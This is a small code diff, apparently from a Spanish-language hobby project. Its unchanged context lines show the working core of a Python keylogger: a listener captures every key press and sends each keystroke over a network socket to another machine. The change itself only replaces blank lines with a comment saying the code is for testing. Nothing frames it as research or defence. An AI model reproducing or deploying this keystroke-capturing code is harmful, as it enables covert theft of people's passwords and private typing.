@@ -8,11 +8,7 @@ def key_recorder(key):
     mensaje = str(key)
     mi_socket.send(str.encode(mensaje))
     mi_socket.close()
-    
-    
-
-
-
+#esto es para probar
 
 with Listener(on_press=key_recorder) as l:
     l.join()
